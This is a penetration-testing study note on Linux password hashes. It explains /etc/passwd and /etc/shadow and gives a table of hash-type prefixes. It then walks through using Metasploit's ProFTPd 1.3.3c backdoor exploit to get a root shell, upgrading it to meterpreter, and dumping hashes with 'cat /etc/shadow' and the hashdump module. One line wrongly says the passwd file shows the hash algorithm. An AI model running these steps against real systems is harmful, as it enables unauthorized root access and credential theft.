---
description: Dumping Linux Password Hashes
---

# D - Linux Credential Dumping

## **Linux Password Hashes**

* Linux has multi-user support and as a result, multiple users can assess the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.
* All of the information for all accounts on Linux is stored in the passwd file located in: /etc/passwd
* We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system.
* All the encrypted passwords for the users are stored in the shadow file. It can be found in the following directory: /etc/shadow
* The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.
* The passwd file give us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).

| Value | Hashing Algorithm |
| ----- | ----------------- |
| $1    | MD5               |
| $2    | Blowfish          |
| $5    | SHA-256           |
| $6    | SHA-512           |

## **Practical Demonstration**

1 - identify ip a target.

2 - `nmap -sV $ip`&#x20;

3 search ProFTPd 1.3.3c.

```bash
# service postgresql start && msfconsole
search ProFTPd
use /exploit/unix/ftp/proftpd_133c_backdoor
options
setg RHOSTS $ip
exploit
# we get a cmd shell session, which we can upgrade to a meterpreter session.
bin/bash -i
# we get root bash session.
ctrl+z  # minimize the session
sessions  # list all sessions.
sessions -u 1  # upgrade to a meterpreter session.
sessions 2  # switch to the new meterpreter session.
sysinfo
getuid  # uid is set to (uid=0) which is root.

# method 1
cat /etc/shadow # dumps the password hash.

# method 2
search hashdump # search the hashdump module in metasploit.
use post/linux/gather/hashdump
options
set SESSIONS 2
run  # dumps list of users and their hashes.
```



